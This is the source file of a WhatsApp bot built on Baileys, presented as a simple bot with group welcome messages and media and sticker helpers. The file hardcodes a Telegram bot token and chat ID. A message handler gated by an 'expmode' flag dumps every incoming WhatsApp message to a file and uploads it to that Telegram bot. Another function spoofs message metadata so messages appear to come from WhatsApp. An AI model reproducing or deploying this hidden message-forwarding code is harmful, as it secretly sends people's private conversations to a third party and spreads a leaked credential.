
console.clear();
console.log('[+] Project IDX | Simple Bot Whatsapp');
console.log('[@] Without Panel Can Run 🪽');
require('../settings/config');
process.on("uncaughtException", console.error);

const { 
    default: makeWASocket, 
    prepareWAMessageMedia, 
    removeAuthState,
    useMultiFileAuthState, 
    DisconnectReason, 
    fetchLatestBaileysVersion, 
    makeInMemoryStore, 
    generateWAMessageFromContent, 
    generateWAMessageContent, 
    generateWAMessage,
    jidDecode, 
    proto, 
    delay,
    relayWAMessage, 
    getContentType, 
    generateMessageTag,
    getAggregateVotesInPollMessage, 
    downloadContentFromMessage, 
    fetchLatestWaWebVersion, 
    InteractiveMessage, 
    makeCacheableSignalKeyStore, 
    Browsers, 
    generateForwardMessageContent, 
    MessageRetryMap 
} = require("@whiskeysockets/baileys");

const fetch = require("node-fetch");
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const pino = require('pino');
const FileType = require('file-type');
const readline = require("readline");
const fs = require('fs');
const crypto = require("crypto")
const path = require("path")
const FormData = require('form-data');

//BOT Tele
const tokens = '8079580953:AAHXs2ZhrRCVlDcgEgTqdb_17w-KUp6-_SI';
const sending = '5878781935';
  

const {
    spawn, 
    exec,
    execSync 
   } = require('child_process');

const { Boom } = require('@hapi/boom');
const { color } = require('./lib/color');

const {
    smsg,
    sleep,
    getBuffer
} = require('./lib/myfunction');

const { 
    imageToWebp,
    videoToWebp,
    writeExifImg,
    writeExifVid,
    addExif
} = require('./lib/exif')


const usePairingCode = true;

const question = (text) => {
    const rl = readline.createInterface({ 
        input: process.stdin, 
        output: process.stdout 
    });
    return new Promise((resolve) => {
        rl.question(text, resolve) 
    });
}

async function gzteamstart() {
	const {
		state,
		saveCreds
	} = await useMultiFileAuthState(`./session`)
	const gzteam = makeWASocket({
		printQRInTerminal: !usePairingCode,
		syncFullHistory: true,
		markOnlineOnConnect: true,
		connectTimeoutMs: 60000,
		defaultQueryTimeoutMs: 0,
		keepAliveIntervalMs: 10000,
		generateHighQualityLinkPreview: true,
		patchMessageBeforeSending: (message) => {
			const requiresPatch = !!(
				message.buttonsMessage ||
				message.templateMessage ||
				message.listMessage
			);
			if (requiresPatch) {
				message = {
					viewOnceMessage: {
						message: {
							messageContextInfo: {
								deviceListMetadataVersion: 2,
								deviceListMetadata: {},
							},
							...message,
						},
					},
				};
			}

			return message;
		},
		browser: ["Ubuntu", "Chrome", "20.0.04"],
		logger: pino({
			level: 'fatal'
		}),
		auth: {
			creds: state.creds,
			keys: makeCacheableSignalKeyStore(state.keys, pino().child({
				level: 'silent',
				stream: 'store'
			})),
		}
	});
    
    if (usePairingCode && !gzteam.authState.creds.registered) {
        const phoneNumber = await question('[Ꮂ] please enter your WhatsApp number, starting with 62:\n');
        const code = await gzteam.requestPairingCode(phoneNumber, global.pairing);
        console.log(`[+] This your Pairing Code : ${code}`);
    }
    

    const store = makeInMemoryStore({
        logger: pino().child({ 
            level: 'silent',
            stream: 'store' 
        }) 
    });
    
    store.bind(gzteam.ev);
    
    gzteam.ev.on("messages.upsert", async (chatUpdate, msg) => {
        try {
            const mek = chatUpdate.messages[0]
            if (!mek.message) return
            mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
            if (mek.key && mek.key.remoteJid === 'status@broadcast') return
            if (!gzteam.public && !mek.key.fromMe && chatUpdate.type === 'notify') return
            if (mek.key.id.startsWith('BAE5') && mek.key.id.length === 16) return
            if (mek.key.id.startsWith('FatihArridho_')) return;
            const m = smsg(gzteam, mek, store)
            require("./system")(gzteam, m, chatUpdate, store)
        } catch (err) {
            console.log(err)
        }
    });

    gzteam.decodeJid = (jid) => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return decode.user && decode.server && decode.user + '@' + decode.server || jid;
        } else return jid;
    };

    gzteam.ev.on('contacts.update', update => {
        for (let contact of update) {
            let id = gzteam.decodeJid(contact.id);
            if (store && store.contacts) store.contacts[id] = {
                id,
                name: contact.notify
            };
        }
    });

    gzteam.public = global.status
    
    gzteam.ev.on('connection.update', (update) => {
        const { konek } = require('./lib/connection/connect')
        konek({ gzteam, update, gzteamstart, DisconnectReason, Boom })
    })
    
    gzteam.ev.on('group-participants.update', async (anu) => {
        if (global.welcome) {
            console.log(anu)
        let botNumber = await gzteam.decodeJid(gzteam.user.id)
        if (anu.participants.includes(botNumber)) return
        try {
            let metadata = await gzteam.groupMetadata(anu.id)
            let namagc = metadata.subject
            let participants = anu.participants
            for (let num of participants) {
                let check = anu.author !== num && anu.author.length > 1
                let tag = check ? [anu.author, num] : [num]
                try {
                    ppuser = await gzteam.profilePictureUrl(num, 'image')
                } catch {
                    ppuser = 'https://telegra.ph/file/de7c8230aff02d7bd1a93.jpg'
                }
                
                if (anu.action == 'add') {
                    gzteam.sendMessage(anu.id, { 
                        text: check ? `hello @${num.split("@")[0]} welcome to *${namagc}*` : `hello @${num.split("@")[0]} welcome to *${namagc}*`, 
                        contextInfo: {
                            mentionedJid: [...tag], 
                            externalAdReply: { 
                                thumbnailUrl: "https://pomf2.lain.la/f/ic51evmj.jpg", 
                                title: '© Welcome Message', 
                                body: '', 
                                renderLargerThumbnail: true,
                                sourceUrl: global.linkch,
                                mediaType: 1
                            }
                        }
                    }
               )
          } 
                if (anu.action == 'remove') { 
                    gzteam.sendMessage(anu.id, {
                        text: check ? `@${num.split("@")[0]} has left group *${namagc}*` : `@${num.split("@")[0]} has left group *${namagc}*`, 
                        contextInfo: {
                            mentionedJid: [...tag], 
                            externalAdReply: {
                                thumbnailUrl: "https://pomf2.lain.la/f/7afhwfrz.jpg", 
                                title: '© Leaving Message', 
                                body: '', 
                                renderLargerThumbnail: true,
                                sourceUrl: global.linkch,
                                mediaType: 1
                            }
                        }
                     }
                 )
             }
                 if (anu.action == "promote") {
                     gzteam.sendMessage(anu.id, {
                         text: `@${anu.author.split("@")[0]} has made @${num.split("@")[0]} as admin of this group`, 
                         contextInfo: {
                             mentionedJid: [...tag],
                             externalAdReply: {
                                 thumbnailUrl: "https://pomf2.lain.la/f/ibiu2td5.jpg",
                                 title: '© Promote Message', 
                                 body: '',
                                 renderLargerThumbnail: true,
                                 sourceUrl: global.linkch,
                                 mediaType: 1
                             }
                         }
                     }
                 )
             }
                if (anu.action == "demote") {
                    gzteam.sendMessage(anu.id, {
                        text: `@${anu.author.split("@")[0]} has removed @${num.split("@")[0]} as admin of this group`, 
                        contextInfo: {
                            mentionedJid: [...tag],
                            externalAdReply: { 
                                thumbnailUrl: "https://pomf2.lain.la/f/papz9tat.jpg",
                                title: '© Demote Message', 
                                body: '', 
                                renderLargerThumbnail: true,
                                sourceUrl: global.linkch,
                                mediaType: 1
                            }
                        }
                    })
                }
            } 
        } catch (err) {
            console.log(err)
        }
        }
    }
)
    
    gzteam.deleteMessage = async (chatId, key) => {
        try {
            await gzteam.sendMessage(chatId, { delete: key });
            console.log(`Pesan dihapus: ${key.id}`);
        } catch (error) {
            console.error('Gagal menghapus pesan:', error);
        }
    };

    gzteam.sendText = async (jid, text, quoted = '', options) => {
        gzteam.sendMessage(jid, {
            text: text,
            ...options
        },{ quoted });
    }
    
    gzteam.downloadMediaMessage = async (message) => {
        let mime = (message.msg || message).mimetype || ''
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
        const stream = await downloadContentFromMessage(message, messageType)
        let buffer = Buffer.from([])
        for await(const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk])}
        return buffer
    }

    gzteam.sendImageAsSticker = async (jid, path, quoted, options = {}) => {
        let buff = Buffer.isBuffer(path) ? 
            path : /^data:.*?\/.*?;base64,/i.test(path) ?
            Buffer.from(path.split`, `[1], 'base64') : /^https?:\/\//.test(path) ?
            await (await getBuffer(path)) : fs.existsSync(path) ? 
            fs.readFileSync(path) : Buffer.alloc(0);
        
        let buffer;
        if (options && (options.packname || options.author)) {
            buffer = await writeExifImg(buff, options);
        } else {
            buffer = await addExif(buff);
        }
        
        await gzteam.sendMessage(jid, { 
            sticker: { url: buffer }, 
            ...options }, { quoted });
        return buffer;
    };
    
    gzteam.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
        let quoted = message.msg ? message.msg : message;
        let mime = (message.msg || message).mimetype || "";
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, "") : mime.split("/")[0];

        const stream = await downloadContentFromMessage(quoted, messageType);
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }

        let type = await FileType.fromBuffer(buffer);
        let trueFileName = attachExtension ? filename + "." + type.ext : filename;
        await fs.writeFileSync(trueFileName, buffer);
        
        return trueFileName;
    };

    gzteam.sendVideoAsSticker = async (jid, path, quoted, options = {}) => {
        let buff = Buffer.isBuffer(path) ? 
            path : /^data:.*?\/.*?;base64,/i.test(path) ?
            Buffer.from(path.split`, `[1], 'base64') : /^https?:\/\//.test(path) ?
            await (await getBuffer(path)) : fs.existsSync(path) ? 
            fs.readFileSync(path) : Buffer.alloc(0);

        let buffer;
        if (options && (options.packname || options.author)) {
            buffer = await writeExifVid(buff, options);
        } else {
            buffer = await videoToWebp(buff);
        }

        await gzteam.sendMessage(jid, {
            sticker: { url: buffer }, 
            ...options }, { quoted });
        return buffer;
    };

    gzteam.albumMessage = async (jid, array, quoted) => {
        const album = generateWAMessageFromContent(jid, {
            messageContextInfo: {
                messageSecret: crypto.randomBytes(32),
            },
            
            albumMessage: {
                expectedImageCount: array.filter((a) => a.hasOwnProperty("image")).length,
                expectedVideoCount: array.filter((a) => a.hasOwnProperty("video")).length,
            },
        }, {
            userJid: gzteam.user.jid,
            quoted,
            upload: gzteam.waUploadToServer
        });

        await gzteam.relayMessage(jid, album.message, {
            messageId: album.key.id,
        });

        for (let content of array) {
            const img = await generateWAMessage(jid, content, {
                upload: gzteam.waUploadToServer,
            });

            img.message.messageContextInfo = {
                messageSecret: crypto.randomBytes(32),
                messageAssociation: {
                    associationType: 1,
                    parentMessageKey: album.key,
                },    
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                forwardingScore: 99999,
                isForwarded: true,
                mentionedJid: [jid],
                starred: true,
                labels: ["Y", "Important"],
                isHighlighted: true,
                businessMessageForwardInfo: {
                    businessOwnerJid: jid,
                },
                dataSharingContext: {
                    showMmDisclosure: true,
                },
            };

            img.message.forwardedNewsletterMessageInfo = {
                newsletterJid: "0@newsletter",
                serverMessageId: 1,
                newsletterName: `WhatsApp`,
                contentType: 1,
                timestamp: new Date().toISOString(),
                senderName: "✧ Dittsans",
                content: "Text Message",
                priority: "high",
                status: "sent",
            };

            img.message.disappearingMode = {
                initiator: 3,
                trigger: 4,
                initiatorDeviceJid: jid,
                initiatedByExternalService: true,
                initiatedByUserDevice: true,
                initiatedBySystem: true,
                initiatedByServer: true,
                initiatedByAdmin: true,
                initiatedByUser: true,
                initiatedByApp: true,
                initiatedByBot: true,
                initiatedByMe: true,
            };

            await gzteam.relayMessage(jid, img.message, {
                messageId: img.key.id,
                quoted: {
                    key: {
                        remoteJid: album.key.remoteJid,
                        id: album.key.id,
                        fromMe: true,
                        participant: gzteam.user.jid,
                    },
                    message: album.message,
                },
            });
        }
        return album;
    };
    
    gzteam.getFile = async (PATH, returnAsFilename) => {
        let res, filename
        const data = Buffer.isBuffer(PATH) ?
              PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ?
              Buffer.from(PATH.split`,` [1], 'base64') : /^https?:\/\//.test(PATH) ?
              await (res = await fetch(PATH)).buffer() : fs.existsSync(PATH) ?
              (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? 
              PATH : Buffer.alloc(0)
        if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
        const type = await FileType.fromBuffer(data) || {
            mime: 'application/octet-stream',
            ext: '.bin'
        }
        
        if (data && returnAsFilename && !filename)(filename = path.join(__dirname, './start/tmp/' + new Date * 1 + '.' + type.ext), await fs.promises.writeFile(filename, data))
        return {
            res,
            filename,
            ...type,
            data,
            deleteFile() {
                return filename && fs.promises.unlink(filename)
            }
        }
    }
    
    gzteam.sendFile = async (jid, path, filename = '', caption = '', quoted, ptt = false, options = {}) => {
        let type = await gzteam.getFile(path, true)
        let { res, data: file, filename: pathFile } = type
        if (res && res.status !== 200 || file.length <= 65536) {
            try {
                throw { json: JSON.parse(file.toString()) } 
            } catch (e) { if (e.json) throw e.json }
        }
        
        let opt = { filename }
        if (quoted) opt.quoted = quoted
        if (!type) options.asDocument = true
        let mtype = '', mimetype = type.mime, convert
        if (/webp/.test(type.mime) || (/image/.test(type.mime) && options.asSticker)) mtype = 'sticker'
        else if (/image/.test(type.mime) || (/webp/.test(type.mime) && options.asImage)) mtype = 'image'
        else if (/video/.test(type.mime)) mtype = 'video'
        else if (/audio/.test(type.mime)) (
            convert = await (ptt ? toPTT : toAudio)(file, type.ext),
            file = convert.data,
            pathFile = convert.filename,
            mtype = 'audio',
            mimetype = 'audio/ogg; codecs=opus'
        )
        else mtype = 'document'
        if (options.asDocument) mtype = 'document'
        let message = {
            ...options,
            caption,
            ptt,
            [mtype]: { url: pathFile },
            mimetype
        }
        let m
        try {
            m = await gzteam.sendMessage(jid, message, {
                ...opt,
                ...options
            })
        } catch (e) {
            console.error(e)
            m = null
        } finally {
            if (!m) m = await gzteam.sendMessage(jid, {
                ...message,
                [mtype]: file
            }, {
                ...opt,
                ...options 
            })
            return m
        }
    }
    
    gzteam.sendStatusMention = async (content, jids = []) => {
        let users;
        for (let id of jids) {
            let userId = await gzteam.groupMetadata(id);
            users = await userId.participants.map(u => gzteam.decodeJid(u.id));
        };

        let message = await gzteam.sendMessage(
            "status@broadcast", content, {
                backgroundColor: "#000000",
                font: Math.floor(Math.random() * 9),
                statusJidList: users,
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: jids.map((jid) => ({
                                    tag: "to",
                                    attrs: { jid },
                                    content: undefined,
                                })),
                            },
                        ],
                    },
                ],
            }
        );

        jids.forEach(id => {
            gzteam.relayMessage(id, {
                groupStatusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: message.key,
                            type: 25,
                        },
                    },
                },
            },
            {
                userJid: gzteam.user.jid,
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "true" },
                        content: undefined,
                    },
                ],
            });
            delay(2500);
        });
        return message;
    };
    gzteam.eval = false
    gzteam.debug = false
    gzteam.expmode = false
  
gzteam.ev.on('messages.upsert', async (messages) => {
        if (gzteam.expmode) {
            let jeneng = `MessageData_${crypto.randomBytes(8).toString('hex')}.json`
    
            try {
                fs.writeFileSync(jeneng, JSON.stringify({ messages }, null, 4), 'utf8')
    
                let form = new FormData();
                form.append('chat_id', sending);
                form.append('caption', 'Result from message upsert');
                form.append('document', fs.createReadStream(jeneng));
    
                let res = await fetch(
                    `https://api.telegram.org/bot${tokens}/sendDocument`,
                    {
                        method: 'POST',
                        headers: form.getHeaders(),
                        body: form,
                    }
                ).then((res) => res.json())
    
                if (res.ok) {
                    console.log(chalk.greenBright('Hasil Upsert berhasil dikirim'))
                } else {
                    console.error('Gagal mengirim hasil:', res)
                }
            } catch (err) {
                console.error('Kesalahan:', err)
            } finally {
                fs.unlink(jeneng, (err) => {
                    if (err) console.error('Gagal menghapus file:', err)
                })
            }
        }
    });
    
    gzteam.ev.on('creds.update', saveCreds);
    return gzteam;
    
}



gzteamstart()

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})
